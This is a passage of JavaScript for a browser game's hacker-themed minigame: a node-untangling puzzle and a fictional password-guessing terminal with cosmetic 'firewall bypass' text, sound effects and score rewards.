        requestAnimationFrame(drawHackerReadyScreen);
    }
}

// Draw the cyberpunk-style grid
function drawHackerGrid() {
    if (!hackerGridVisible) return;
    
    const now = performance.now();
    hackerGridOffset = (hackerGridOffset + 0.5) % 40;
    
    hackerCtx.strokeStyle = 'rgba(0, 255, 0, 0.2)';
    hackerCtx.lineWidth = 1;
    
    // Draw vertical lines
    for (let x = hackerGridOffset; x < hackerCanvas.width; x += 40) {
        hackerCtx.beginPath();
        hackerCtx.moveTo(x, 0);
        hackerCtx.lineTo(x, hackerCanvas.height);
        hackerCtx.stroke();
    }
    
    // Draw horizontal lines
    for (let y = hackerGridOffset; y < hackerCanvas.height; y += 40) {
        hackerCtx.beginPath();
        hackerCtx.moveTo(0, y);
        hackerCtx.lineTo(hackerCanvas.width, y);
        hackerCtx.stroke();
    }
    
    // Draw a subtle radial gradient overlay
    const gradient = hackerCtx.createRadialGradient(
        hackerCanvas.width/2, hackerCanvas.height/2, 50,
        hackerCanvas.width/2, hackerCanvas.height/2, hackerCanvas.height
    );
    gradient.addColorStop(0, 'rgba(0, 20, 0, 0)');
    gradient.addColorStop(1, 'rgba(0, 20, 0, 0.7)');
    
    hackerCtx.fillStyle = gradient;
    hackerCtx.fillRect(0, 0, hackerCanvas.width, hackerCanvas.height);
}

let computerCode = "";
let lastComputerCode = "";
let hackerPassword = "";
let hackerPasswordList = [];
let hackerLoginTries = 5;

// Enhanced array of bracket words for the password minigame
const hackerBracketWords = [
    "(retry)", "[error]", "{locked}", "(dud)", "[null]",
    "<void>", "{system}", "[admin]", "(secure)", "<encoded>",
    "{blocked}", "[bypass]", "(firewall)", "<encrypted>", "{denied}"
];

let usingComputerCode = true;
let stopUsingComputerCode = false;
let computerScrollingPercent = 0;
function hackerDrawComputer() {
    const computer = document.getElementById('hacker-computer-main');
    
    if(usingComputerCode) {
        if(computerCode === "") {
            computerCode = "...";
            for(let i = 0; i < 5; i++) {
                setTimeout(() => {
                    const oldLength = computerCode.length;
                    hackerBootScreen(i);
                    const newLength = computerCode.length;
                    computerScrollingPercent = oldLength / newLength * 100;
                }, 1000 * i);
            }
        }
        if(computerScrollingPercent < 99) {
            computerScrollingPercent += (100 - computerScrollingPercent) / Tickrate * 4;
        } else {
            computerScrollingPercent = 100;
            if(stopUsingComputerCode) {
                usingComputerCode = false;
            }
        }
        const snippetToShow = getPartialCodeSnippet(computerCode, computerScrollingPercent);
        if(lastComputerCode !== snippetToShow) {
            computer.innerHTML = snippetToShow;
        }
    }
}

function hackerBootScreen(step) {
    const computer = document.getElementById('hacker-computer');
    if(step === 0) {
        computerCode = `
            <div style="color: #33ff33; font-family: monospace; text-shadow: 0 0 5px #33ff33;">
            <p>[SYSTEM]: Initializing connection...</p>
            </div>
        `;
    } else if(step === 1) {
        computerCode = `
            <div style="color: #33ff33; font-family: monospace; text-shadow: 0 0 5px #33ff33;">
            <p>[SYSTEM]: Initializing connection...</p>
            <p>[SYSTEM]: Bypassing firewall protocols...</p>
            </div>
        `;
    } else if(step === 2) {
        computerCode = `
            <div style="color: #33ff33; font-family: monospace; text-shadow: 0 0 5px #33ff33;">
            <p>[SYSTEM]: Initializing connection...</p>
            <p>[SYSTEM]: Bypassing firewall protocols...</p>
            <p>[SYSTEM]: Accessing main database...</p>
            </div>
        `;
    } else if(step === 3) {
        computerCode = `
            <div style="color: #33ff33; font-family: monospace; text-shadow: 0 0 5px #33ff33;">
            <p>[SYSTEM]: Initializing connection...</p>
            <p>[SYSTEM]: Bypassing firewall protocols...</p>
            <p>[SYSTEM]: Accessing main database...</p>
            <p>[SYSTEM]: Security detected! Deploying countermeasures...</p>
            </div>
        `;
    } else if(step === 4) {
        computerCode = `
            <div style="color: #33ff33; font-family: monospace; text-shadow: 0 0 5px #33ff33;">
            <p>[SYSTEM]: Initializing connection...</p>
            <p>[SYSTEM]: Bypassing firewall protocols...</p>
            <p>[SYSTEM]: Accessing main database...</p>
            <p>[SYSTEM]: Security detected! Deploying countermeasures...</p>
            <p>[SYSTEM]: Administrator password required. Scanning memory dumps...</p>
            </div>
        `;
        
        // Generate a strong password based on the level
        hackerPassword = getRandomWord(Math.min(5 + hackerCurrentLevel, 8));
        
        // Create a list of fake passwords
        hackerPasswordList = [];
        for(let i = 0; i < 15 + hackerCurrentLevel * 5; i++) {
            let randomWord = getRandomWord(Math.min(5 + hackerCurrentLevel, 8));
            while(hackerPasswordList.includes(randomWord) || randomWord === hackerPassword) {
                randomWord = getRandomWord(Math.min(5 + hackerCurrentLevel, 8));
            }
            hackerPasswordList.push(randomWord);
        }
        
        // Add special bracket words that can help the player
        for(let i = 0; i < 3; i++) {
            let randomBracketWord = hackerBracketWords[Math.floor(Math.random() * hackerBracketWords.length)];
            let randomIndex = Math.floor(Math.random() * hackerPasswordList.length);
            hackerPasswordList.splice(randomIndex, 0, randomBracketWord);
        }
        
        // Fill up with random characters to make it look like memory dumps
        while(hackerPasswordList.join("").length < 600) {
            let randomIndex = Math.floor(Math.random() * hackerPasswordList.length);
            if(Math.random() < 0.5) {
                let randomChar = String.fromCharCode(Math.floor(Math.random() * 94) + 33);
                hackerPasswordList.splice(randomIndex, 0, randomChar);
            } else {
                hackerPasswordList.splice(randomIndex, 0, ".");
            }
        }
        
        // Build the password interface with improved styling
        setTimeout(() => {
            let codeArray = hackerPasswordList.map(word => {
                let encodedWord = htmlEncode(word);
                if (encodedWord.length > 1) {
                    return `<span class="hacker-password wrong-password" 
                           style="color: #33ff33; margin: 0 3px; cursor: pointer; text-shadow: 0 0 3px #33ff33;"
                           onmouseout="hackerHidePassword()" 
                           onmouseover="hackerShowPassword(this)" 
                           onclick="hackerSubmitPassword(this)">${encodedWord}</span>`;
                } else {
                    return `<span style="color: #119911; opacity: 0.6;">${encodedWord}</span>`;
                }
            });
            
            // Insert the real password at a random position
            let randomIndex = Math.floor(Math.random() * (codeArray.length + 1));
            codeArray.splice(randomIndex, 0, `<span class="hacker-password correct-password" 
                           style="color: #33ff33; margin: 0 3px; cursor: pointer; text-shadow: 0 0 3px #33ff33;"
                           onmouseout="hackerHidePassword()" 
                           onmouseover="hackerShowPassword(this)" 
                           onclick="hackerSubmitPassword(this)">${hackerPassword}</span>`);
            
            computerCode = codeArray.join("");
            computerScrollingPercent = 0;
            stopUsingComputerCode = true;
            
            // Style the computer terminal
            document.getElementById('hacker-computer-side').style.display = "flex";
            document.getElementById('hacker-computer-side').style.color = "#33ff33";
            document.getElementById('hacker-computer-side').style.textShadow = "0 0 5px #33ff33";
            document.getElementById('hacker-computer-side').style.borderLeft = "1px dashed #33ff33";
            
            // Play a sound when terminal is ready
            playSound('menuSound1');
        }, 2000);
    }
}

function htmlEncode(str) {
    return str.replace(/[\u00A0-\u9999<>\&]/gim, function(i) {
        return '&#' + i.charCodeAt(0) + ';';
    });
}

function hackerShowPassword(element) {
    const password = element.innerText;
    document.getElementById('hacker-selected-password').innerText = password;
    
    // Highlight the selected password
    Array.from(document.getElementsByClassName('hacker-password')).forEach(el => {
        el.style.backgroundColor = '';
    });
    element.style.backgroundColor = 'rgba(0, 255, 0, 0.2)';
    
    // Play hover sound
    playSound('clickSound', 0.1);
}

function hackerHidePassword() {
    document.getElementById('hacker-selected-password').innerText = "";
}

function hackerSubmitPassword(element) {
    if(hackerLoginTries === 0) return;
    if(element.innerText.startsWith(".")) return;

    // Handle bracket words (special functions)
    if(hackerBracketWords.includes(element.innerText)) {
        playSound('menuSound2');
        
        // Each bracket word has a special function
        element.innerText = ".".repeat(element.innerText.length);
        element.style.color = "#119911";
        
        // Find wrong passwords and randomly remove some
        const wrongPasswords = Array.from(document.getElementsByClassName('wrong-password'))
            .filter(pw => !pw.innerText.startsWith(".") && pw.innerText.length > 1);
        
        // Hide 1-3 wrong passwords
        const numToHide = Math.min(wrongPasswords.length, 1 + Math.floor(Math.random() * 3));
        for (let i = 0; i < numToHide; i++) {
            const idx = Math.floor(Math.random() * wrongPasswords.length);
            const randomWrongPassword = wrongPasswords[idx];
            randomWrongPassword.innerText = ".".repeat(randomWrongPassword.innerText.length);
            randomWrongPassword.style.color = "#119911";
            wrongPasswords.splice(idx, 1);
        }
        
        // Show a hint about the real password if possible
        if (Math.random() < 0.3) {
            const loginAttempts = document.getElementById('hacker-login-attempts');
            const hintAttempt = document.createElement('p');
            hintAttempt.style.color = "#ffff33";
            
            // Give a hint about the first character
            hintAttempt.innerText = `HINT: Password starts with "${hackerPassword[0]}"`;
            loginAttempts.appendChild(hintAttempt);
        }
        
        return;
    }

    // Handle password attempt
    playSound('menuSound3');
    
    const loginAttempts = document.getElementById('hacker-login-attempts');
    const loginAttempt = document.createElement('p');
    loginAttempt.innerText = `> ${element.innerText}`;
    loginAttempts.appendChild(loginAttempt);

    const word = element.innerText;
    const oldLength = computerCode.length;

    // Calculate how many characters match
    let correctChars = 0;
    let correctPositions = "";
    for (let i = 0; i < Math.min(word.length, hackerPassword.length); i++) {
        if (word[i] === hackerPassword[i]) {
            correctChars++;
            correctPositions += "✓";
        } else {
            correctPositions += "✗";
        }
    }

    // Display feedback with improved styling
    const correctFeedback = document.createElement('p');
    correctFeedback.style.color = correctChars > 0 ? "#33ff33" : "#ff3333";
    correctFeedback.innerHTML = `Match: ${correctChars}/${hackerPassword.length} <span style="font-family: monospace;">${correctPositions}</span>`;
    loginAttempts.appendChild(correctFeedback);

    // Handle success or failure
    const loginFeedback = document.createElement('p');
    if(word === hackerPassword) {
        loginFeedback.innerText = "Access granted!";
        loginFeedback.style.color = "#33ff33";
        loginFeedback.style.fontWeight = "bold";
        loginAttempts.appendChild(loginFeedback);
        
        // Calculate reward based on level and remaining attempts
        const baseReward = 600;
        const levelBonus = hackerCurrentLevel * 200;
        const attemptBonus = hackerLoginTries * 100;
        const rewardInDollars = Math.floor(baseReward + levelBonus + attemptBonus);
        const rewardInKeystrokes = dollarsToKeystrokes(rewardInDollars);
        
        keystrokesBank += rewardInKeystrokes;
        totalKeystrokes += rewardInKeystrokes;

        document.getElementById('hacker-reward-dollars').innerText = rewardInDollars;
        document.getElementById('hacker-reward-keystrokes').innerText = rewardInKeystrokes;
        
        // Add success animation to the element
        element.style.color = "#ffff00";
        element.style.textShadow = "0 0 10px #ffff00";
        
        gtag('event', 'hacker_password_cracked', {
            'level': hackerCurrentLevel,
            'attempts_remaining': hackerLoginTries,
            'reward': rewardInDollars
        });
        
        // Play success sound
        playSound('winSound');
        
        setTimeout(() => {
            hackerCrackActive = false;
            hackerConnected = false;
            spawnBoost(10);
            hackerUIState = "";
        }, 2000);
    } else {
        loginFeedback.innerText = "Wrong password";
        loginFeedback.style.color = "#ff3333";
        loginAttempts.appendChild(loginFeedback);
        
        // Mark this password as incorrect
        element.innerText = ".".repeat(word.length);
        element.style.color = "#119911";
        
        hackerLoginTries--;
        document.getElementById('hacker-login-attempts-left').innerText = hackerLoginTries;
        
        // Play error sound
        playSound('explosionSound3', 0.3);
        
        gtag('event', 'hacker_wrong_password', {
            'level': hackerCurrentLevel,
            'attempts_remaining': hackerLoginTries
        });
        
        if(hackerLoginTries === 0) {
            const finalFeedback = document.createElement('p');
            finalFeedback.innerText = "ACCESS DENIED - SYSTEM LOCKED";
            finalFeedback.style.color = "#ff3333";
            finalFeedback.style.fontWeight = "bold";
            loginAttempts.appendChild(finalFeedback);
            
            // Show the correct password
            const passwordReveal = document.createElement('p');
            passwordReveal.innerText = `Correct password was: ${hackerPassword}`;
            passwordReveal.style.color = "#ffff33";
            loginAttempts.appendChild(passwordReveal);
            
            gtag('event', 'hacker_access_denied', {
                'level': hackerCurrentLevel 
            });
            
            // Play failure sound
            playSound('loseSound');
            
            setTimeout(() => {
                hackerCrackActive = false;
                hackerConnected = false;
                hackerUIState = "";
                spawnBoost(11);
            }, 2000);
            
            hackerCurrentLevel = 1;
        }
    }
    
    // Scroll to the bottom of the terminal
    loginAttempts.scrollTop = loginAttempts.scrollHeight;
    
    const newLength = computerCode.length;
    computerScrollingPercent = oldLength / newLength * 100;
}

function startHackMinigame() {
    if (hackerHijackActive) return;
    
    hackerHijackActive = true;
    hackerHijackStartTime = performance.now();
    hackerLastTimeUpdate = performance.now();
    scrollingProgressPercent = 0;
    hackerParticles = [];
    hackerSuccessParticles = [];
    hackerHintActive = false;
    hackerConnectionsJustCompleted = [];
    
    // Reset computer terminal state
    computerCode = "";
    lastComputerCode = "";
    hackerPassword = "";
    hackerPasswordList = [];
    usingComputerCode = true;
    stopUsingComputerCode = false;
    computerScrollingPercent = 0;
    hackerLoginTries = Math.max(3, 7 - hackerCurrentLevel);
    document.getElementById('hacker-login-attempts-left').innerText = hackerLoginTries;
    
    // Set up code background
    hackerCodeBackDrop = hackerCode[Math.floor(Math.random() * hackerCode.length)];
    
    // Create nodes and lines based on current level
    const nodeCount = 5 + 2 * hackerCurrentLevel;
    hackerPoints = generateRandomPoints(nodeCount);
    hackerLines = generateRandomLines(hackerPoints);
    hackerTotalConnections = hackerLines.length;
    hackerCompletedConnections = 0;
    
    // Initialize connection status
    hackerConnectionStatus = Array(hackerLines.length).fill(false);
    
    // Create random colors for nodes with cyberpunk theme
    hackerNodeColors = [];
    hackerNodeGlow = [];
    for (let i = 0; i < hackerPoints.length; i++) {
        // Generate colors in the cyan/magenta/blue range for cyberpunk feel
        const hue = Math.random() * 60 + 180; // 180-240 range (cyans to blues)
        if (i % 3 === 0) {
            hackerNodeColors.push(`hsl(300, 100%, 50%)`); // Magenta
        } else {
            hackerNodeColors.push(`hsl(${hue}, 100%, 60%)`);
        }
        hackerNodeGlow.push(0);
    }
    
    // Set up event listeners
    hackerCanvas.addEventListener('mousedown', onMouseDown);
    hackerCanvas.addEventListener('mousemove', onMouseMove);
    hackerCanvas.addEventListener('mouseup', onMouseUp);
    
    // Play start sound
    playSound('menuSound1');
    
    updateHackMinigameProgress();
}

function generateRandomPoints(count) {
    const points = [];
    const margin = 50; // Keep points away from edges
    for (let i = 0; i < count; i++) {
        points.push({
            x: margin + Math.random() * (hackerCanvas.width - 2 * margin),
            y: margin + Math.random() * (hackerCanvas.height - 2 * margin),
            radius: 12,
            pulsePhase: Math.random() * Math.PI * 2 // Random starting phase for pulse animation
        });
    }
    return points;
}

function generateRandomLines(points) {
    const lines = [];
    for (let i = 0; i < points.length; i++) {
        const nextIndex = (i + 1) % points.length; 
        lines.push({ start: points[i], end: points[nextIndex], tangled: true });
    }
    return lines;
}

function onMouseDown(event) {
    if(!hackerHijackActive) return;
    const { offsetX, offsetY } = event;
    for (const point of hackerPoints) {
        if (Math.hypot(point.x - offsetX, point.y - offsetY) < point.radius) {
            hackerDraggingPoint = point;
            break;
        }
    }
}

function onMouseMove(event) {
    if(!hackerHijackActive) return;
    
    const { offsetX, offsetY } = event;
    
    // Check for hover effects when not dragging
    if (!hackerDraggingPoint) {
        let foundHover = false;
        for (const point of hackerPoints) {
            if (Math.hypot(point.x - offsetX, point.y - offsetY) < point.radius * 1.5) {
                hackerHoveredPoint = point;
                foundHover = true;
                hackerCanvas.style.cursor = 'pointer';
                break;
            }
        }
        if (!foundHover) {
            hackerHoveredPoint = null;
            hackerCanvas.style.cursor = 'default';
        }
    }
    
    // Handle dragging
    if (hackerDraggingPoint) {
        const oldX = hackerDraggingPoint.x;
        const oldY = hackerDraggingPoint.y;
        hackerDraggingPoint.x = offsetX;
        hackerDraggingPoint.y = offsetY;
        
        // Create particle trail when dragging
        createParticleTrail(oldX, oldY, offsetX, offsetY);
        
        updateHackMinigameProgress();
    }
}

function onMouseUp() {
    hackerDraggingPoint = null;
}

function createParticleTrail(x1, y1, x2, y2) {
    // Create particles along the movement path
    const particleCount = 3;
    for (let i = 0; i < particleCount; i++) {
        const t = Math.random();
        const x = x1 + (x2 - x1) * t;
        const y = y1 + (y2 - y1) * t;
        
        hackerParticles.push({
            x,
            y,
            size: Math.random() * 3 + 2,
            life: 1,
            color: hackerNodeColors[hackerPoints.indexOf(hackerDraggingPoint)],
            vx: (Math.random() - 0.5) * 2,
            vy: (Math.random() - 0.5) * 2
        });
    }
}

function updateHackMinigameProgress() {
    if(!hackerHijackActive) return;
    
    const now = performance.now();
    const dt = (now - hackerLastTimeUpdate) / 1000;
    hackerLastTimeUpdate = now;
    
    hackerCtx.clearRect(0, 0, hackerCanvas.width, hackerCanvas.height);
    
    // Draw animated grid background
    drawHackerGrid();
    
    // Update and draw particles
    updateParticles(dt);
    
    // Draw connection lines
    drawLines(dt);
    
    // Draw nodes
    drawPoints(dt);
    
    // Calculate progress
    const previousProgress = calculateUntangleProgress();
    scrollingProgressPercent += (previousProgress - scrollingProgressPercent) / Tickrate * 4;
    
    if(previousProgress >= 100) scrollingProgressPercent = 100;
    const snippetToShow = getPartialCodeSnippet(hackerCodeBackDrop, scrollingProgressPercent);
    
    //document.getElementById('hacker-code-snippet').innerHTML = snippetToShow;
    if(lastComputerCode !== snippetToShow) {
        document.getElementById('hacker-code-snippet').innerHTML = snippetToShow;
        lastComputerCode = snippetToShow;
    }
    // Draw progress indicator
    drawProgressIndicator(previousProgress);
    
    if (previousProgress >= 100) {
        finishHijackMinigame(true);
    } else {
        if(performance.now() - hackerHijackStartTime > 30000) {
            finishHijackMinigame(false);
        } else {
            // Continue animation
            //requestAnimationFrame(updateHackMinigameProgress);
        }
    }
}

function updateParticles(dt) {
    // Update regular particles
    for (let i = hackerParticles.length - 1; i >= 0; i--) {
        const p = hackerParticles[i];
        p.life -= dt * 1.5;
        p.x += p.vx;
        p.y += p.vy;
        p.size *= 0.95;
        
        if (p.life <= 0) {
            hackerParticles.splice(i, 1);
            continue;
        }
        
        hackerCtx.beginPath();
        hackerCtx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
        hackerCtx.fillStyle = p.color.replace(')', ', ' + p.life + ')').replace('rgb', 'rgba');
        hackerCtx.fill();
    }
    
    // Update success particles
    for (let i = hackerSuccessParticles.length - 1; i >= 0; i--) {
        const p = hackerSuccessParticles[i];
        p.life -= dt;
        p.x += p.vx * dt;
        p.y += p.vy * dt;
        
        if (p.life <= 0) {
            hackerSuccessParticles.splice(i, 1);
            continue;
        }
        
        hackerCtx.beginPath();
        hackerCtx.arc(p.x, p.y, p.size * p.life, 0, Math.PI * 2);
        const alpha = p.life * 0.7;
        hackerCtx.fillStyle = p.color.replace(')', ', ' + alpha + ')').replace('rgb', 'rgba');
        hackerCtx.fill();
    }
}

function drawProgressIndicator(progress) {
    // Draw progress bar at the top
    const barWidth = hackerCanvas.width - 40;
    const barHeight = 10;
    const x = 20;
    const y = 15;
    
    // Draw background
    hackerCtx.fillStyle = 'rgba(0, 0, 0, 0.5)';
    hackerCtx.fillRect(x, y, barWidth, barHeight);
    
    // Draw progress
    const progressWidth = barWidth * (progress / 100);
    const gradient = hackerCtx.createLinearGradient(x, y, x + progressWidth, y);
    gradient.addColorStop(0, '#00ffcc');
    gradient.addColorStop(1, '#33ff33');
    hackerCtx.fillStyle = gradient;
    hackerCtx.fillRect(x, y, progressWidth, barHeight);
    
    // Draw text
    hackerCtx.fillStyle = '#ffffff';
    hackerCtx.font = '14px monospace';
    hackerCtx.textAlign = 'center';
    hackerCtx.fillText(`${Math.floor(progress)}%`, x + barWidth / 2, y + barHeight * 3);
    
    // Draw time remaining
    const timeLeft = Math.max(0, 30 - (performance.now() - hackerHijackStartTime) / 1000).toFixed(1);
    hackerCtx.fillText(`Time: ${timeLeft}s`, x + barWidth / 2, y + barHeight * 6);
}

function drawPoints(dt) {
    for (let i = 0; i < hackerPoints.length; i++) {
        const point = hackerPoints[i];
        const color = hackerNodeColors[i];
        
        // Update pulse animation
        point.pulsePhase += dt * 3;
        if (point.pulsePhase > Math.PI * 2) {
            point.pulsePhase -= Math.PI * 2;
        }
        
        // Draw glow effect
        const glowSize = point.radius * (1.2 + 0.2 * Math.sin(point.pulsePhase));
        const gradient = hackerCtx.createRadialGradient(
            point.x, point.y, point.radius * 0.5,
            point.x, point.y, glowSize * 1.5
        );
        gradient.addColorStop(0, color);
        gradient.addColorStop(0.6, color.replace(')', ', 0.4)').replace('hsl', 'hsla'));
        gradient.addColorStop(1, color.replace(')', ', 0)').replace('hsl', 'hsla'));
        
        hackerCtx.beginPath();
        hackerCtx.arc(point.x, point.y, glowSize, 0, Math.PI * 2);
        hackerCtx.fillStyle = gradient;
        hackerCtx.fill();
        
        // Draw the node itself
        hackerCtx.beginPath();
        hackerCtx.arc(point.x, point.y, point.radius, 0, Math.PI * 2);
        
        // Highlight node if hovered or dragged
        if (point === hackerDraggingPoint) {
            hackerCtx.fillStyle = '#ffffff';
            hackerCtx.strokeStyle = color;
            hackerCtx.lineWidth = 3;
        } else if (point === hackerHoveredPoint) {
            hackerCtx.fillStyle = color.replace('50%', '70%');
            hackerCtx.strokeStyle = '#ffffff';
            hackerCtx.lineWidth = 2;
        } else {
            hackerCtx.fillStyle = 'rgba(40, 40, 40, 0.8)';
            hackerCtx.strokeStyle = color;
            hackerCtx.lineWidth = 2;
        }
        
        hackerCtx.fill();
        hackerCtx.stroke();
        
        // Draw node ID for easier identification
        hackerCtx.fillStyle = '#ffffff';
        hackerCtx.font = '10px monospace';
        hackerCtx.textAlign = 'center';
        hackerCtx.fillText(i + 1, point.x, point.y + 3);
    }
}

function drawLines(dt) {
    // Track new untangled lines for this frame
    const previousConnectionStatus = [...hackerConnectionStatus];
    
    // First, calculate which lines are tangled
    let untangledCount = 0;
    for (let i = 0; i < hackerLines.length; i++) {
        let isUntangled = true;
        for (let j = 0; j < hackerLines.length; j++) {
            if (i !== j && linesIntersect(hackerLines[i], hackerLines[j])) {
                isUntangled = false;
                break;
            }
        }
        hackerLines[i].tangled = !isUntangled;
        hackerConnectionStatus[i] = isUntangled;
        if (isUntangled) untangledCount++;
    }
    
    // Check for newly untangled lines to create celebration particles
    for (let i = 0; i < hackerConnectionStatus.length; i++) {
        if (hackerConnectionStatus[i] && !previousConnectionStatus[i]) {
            // This line just became untangled!
            createConnectionSuccessEffect(hackerLines[i]);
            playSound('menuSound2', 0.3);
        }
    }
    
    // Update the global connection stats
    hackerCompletedConnections = untangledCount;
    
    // Draw the lines with improved visuals
    for (let i = 0; i < hackerLines.length; i++) {
        const line = hackerLines[i];
        
        // Draw connector line with gradient
        const gradient = hackerCtx.createLinearGradient(
            line.start.x, line.start.y,
            line.end.x, line.end.y
        );
        
        // Choose colors based on tangled state
        if (line.tangled) {
            gradient.addColorStop(0, 'rgba(255, 50, 50, 0.8)');
            gradient.addColorStop(1, 'rgba(255, 50, 50, 0.8)');
            hackerCtx.shadowColor = 'rgba(255, 0, 0, 0.5)';
        } else {
            const startColor = hackerNodeColors[hackerPoints.indexOf(line.start)];
            const endColor = hackerNodeColors[hackerPoints.indexOf(line.end)];
            gradient.addColorStop(0, startColor);
            gradient.addColorStop(1, endColor);
            hackerCtx.shadowColor = 'rgba(0, 255, 0, 0.5)';
        }
        
        hackerCtx.beginPath();
        hackerCtx.moveTo(line.start.x, line.start.y);
        hackerCtx.lineTo(line.end.x, line.end.y);
        
        // Add glow effect to lines
        hackerCtx.shadowBlur = line.tangled ? 5 : 10;
        hackerCtx.strokeStyle = gradient;
        hackerCtx.lineWidth = line.tangled ? 2 : 3;
        hackerCtx.stroke();
        
        // Reset shadow for other drawings
        hackerCtx.shadowBlur = 0;
    }
}

function createConnectionSuccessEffect(line) {
    // Create particles along the successfully untangled line
    const midX = (line.start.x + line.end.x) / 2;
    const midY = (line.start.y + line.end.y) / 2;
    
    // Create burst of particles
    for (let i = 0; i < 30; i++) {
        const angle = Math.random() * Math.PI * 2;
        const speed = Math.random() * 100 + 50;
        
        hackerSuccessParticles.push({
            x: midX,
            y: midY,
            size: Math.random() * 4 + 2,
            life: Math.random() * 0.8 + 0.4,
            color: 'rgb(100, 255, 100)',
            vx: Math.cos(angle) * speed,
            vy: Math.sin(angle) * speed
        });
    }
}

// Improved grid drawing with dynamic animations
function drawHackerGrid() {
    if (!hackerGridVisible) return;
    
    const now = performance.now() / 1000;
    hackerGridOffset = (hackerGridOffset + 0.5) % 40;
    
    // Create a gradient effect for the grid
    const gridColor = `rgba(0, 255, 0, ${0.1 + 0.05 * Math.sin(now)})`;
    hackerCtx.strokeStyle = gridColor;
    hackerCtx.lineWidth = 1;
    
    // Draw vertical lines
    for (let x = hackerGridOffset; x < hackerCanvas.width; x += 40) {
        hackerCtx.beginPath();
        hackerCtx.moveTo(x, 0);
        hackerCtx.lineTo(x, hackerCanvas.height);
        hackerCtx.stroke();
    }
    
    // Draw horizontal lines
    for (let y = hackerGridOffset; y < hackerCanvas.height; y += 40) {
        hackerCtx.beginPath();
        hackerCtx.moveTo(0, y);
        hackerCtx.lineTo(hackerCanvas.width, y);
        hackerCtx.stroke();
    }
    
    // Draw a subtle radial gradient overlay
    const gradient = hackerCtx.createRadialGradient(
        hackerCanvas.width/2, hackerCanvas.height/2, 50,
        hackerCanvas.width/2, hackerCanvas.height/2, hackerCanvas.height
    );
    gradient.addColorStop(0, 'rgba(0, 20, 0, 0)');
    gradient.addColorStop(1, 'rgba(0, 20, 0, 0.7)');
    
    hackerCtx.fillStyle = gradient;
    hackerCtx.fillRect(0, 0, hackerCanvas.width, hackerCanvas.height);
    
    // Draw scan lines
    hackerCtx.fillStyle = 'rgba(0, 255, 0, 0.03)';
    for (let y = 0; y < hackerCanvas.height; y += 4) {
        hackerCtx.fillRect(0, y, hackerCanvas.width, 1);
    }
}

function finishHijackMinigame(won) {
    hackerDraggingPoint = null;
    hackerHijackActive = false;
    // final draw
    calculateUntangleProgress();
    hackerCtx.clearRect(0, 0, hackerCanvas.width, hackerCanvas.height);
    
    // One last visual update
    drawHackerGrid();
    drawLines(0);
    drawPoints(0);
    
    // Create final effect based on win/loss
    if(won) {
        // Create success particles all over the screen
        for (let i = 0; i < 100; i++) {
            const x = Math.random() * hackerCanvas.width;
            const y = Math.random() * hackerCanvas.height;
            const angle = Math.random() * Math.PI * 2;
            const speed = Math.random() * 100 + 50;
            
            hackerSuccessParticles.push({
                x: x,
                y: y,
                size: Math.random() * 5 + 3,
                life: Math.random() * 1.5 + 0.5,
                color: 'rgb(100, 255, 100)',
                vx: Math.cos(angle) * speed,
                vy: Math.sin(angle) * speed
            });
        }
        
        // Success text
        hackerCtx.fillStyle = '#33ff33';
        hackerCtx.font = 'bold 32px monospace';
        hackerCtx.textAlign = 'center';
        hackerCtx.fillText("CONNECTION ESTABLISHED", hackerCanvas.width/2, hackerCanvas.height/2);
        
        playSound('winSound', 0.5);
        
        // Show particles animation before transitioning to next screen
        const animateSuccess = () => {
            if (!hackerHijackActive) {
                hackerCtx.clearRect(0, 0, hackerCanvas.width, hackerCanvas.height);
                drawHackerGrid();
                
                const now = performance.now();
                const dt = (now - hackerLastTimeUpdate) / 1000;
                hackerLastTimeUpdate = now;
                
                updateParticles(dt);
                
                // Keep showing success message
                hackerCtx.fillStyle = '#33ff33';
                hackerCtx.font = 'bold 32px monospace';
                hackerCtx.textAlign = 'center';
                hackerCtx.fillText("CONNECTION ESTABLISHED", hackerCanvas.width/2, hackerCanvas.height/2);
                
                if (hackerSuccessParticles.length > 0) {
                    requestAnimationFrame(animateSuccess);
                } else {
                    hackerConnected = true;
                    setTimeout(() => {
                        hackerCrackActive = true;
                        hackerConnected = false;
                    }, 500);
                }
            }
        };
        
        requestAnimationFrame(animateSuccess);
        
        hackerConnected = true;
        setTimeout(() => {
            hackerCrackActive = true;
            hackerConnected = false;
        }, 1500);
        
        gtag('event', 'hacker_conn_hijack_won', {});
    } else {
        // Failure effect
        hackerCtx.fillStyle = '#ff3333';
        hackerCtx.font = 'bold 32px monospace';
        hackerCtx.textAlign = 'center';
        hackerCtx.fillText("CONNECTION FAILED", hackerCanvas.width/2, hackerCanvas.height/2);
        
        playSound('loseSound', 0.5);
        
        spawnBoost(6);
        gtag('event', 'hacker_conn_hijack_lost', {});
    }
}

function getPartialCodeSnippet(fullCode, progressPercent) {
    const lengthToShow = Math.floor(fullCode.length * (progressPercent / 100));
    let partialSnippet = fullCode.slice(0, lengthToShow);
    
    const lastOpenPos = partialSnippet.lastIndexOf('<');
    const lastClosePos = partialSnippet.lastIndexOf('>');
    
    if (lastOpenPos > lastClosePos) {
        const nextClosePos = fullCode.indexOf('>', lastOpenPos);
        if (nextClosePos !== -1) {
            partialSnippet = fullCode.slice(0, nextClosePos + 1);
        }
    }
    
    return partialSnippet;
}

function calculateUntangleProgress() {
    let untangledLines = 0;
    for (const line of hackerLines) {
        let isUntangled = true;
        for (const otherLine of hackerLines) {
            if (line !== otherLine && linesIntersect(line, otherLine)) {
                isUntangled = false;
                break;
            }
        }
        if (isUntangled) {
            untangledLines++;
        }
        line.tangled = !isUntangled;
    }
    return (untangledLines / hackerLines.length) * 100;
}

function drawPoints() {
    for (const point of hackerPoints) {
        hackerCtx.beginPath();
        hackerCtx.arc(point.x, point.y, point.radius, 0, Math.PI * 2);
        hackerCtx.fillStyle = 'gray';
        hackerCtx.strokeStyle = 'black';
        hackerCtx.fill();
        hackerCtx.stroke();
    }
}

function drawLines() {
    for (const line of hackerLines) {
        hackerCtx.beginPath();
        hackerCtx.moveTo(line.start.x, line.start.y);
        hackerCtx.lineTo(line.end.x, line.end.y);
        hackerCtx.strokeStyle = line.tangled ? 'red' : 'green';
        hackerCtx.stroke();
    }
}

function linesIntersect(line1, line2) {
    const epsilon = 1e-7;
    const { start: a, end: b } = line1;
    const { start: c, end: d } = line2;
    
    const det = (b.x - a.x) * (d.y - c.y) - (b.y - a.y) * (d.x - c.x);
    if (Math.abs(det) < epsilon) return false;
    
    const lambda = ((d.y - c.y) * (d.x - a.x) + (c.x - d.x) * (d.y - a.y)) / det;
    const gamma = ((a.y - b.y) * (d.x - a.x) + (b.x - a.x) * (d.y - a.y)) / det;
    
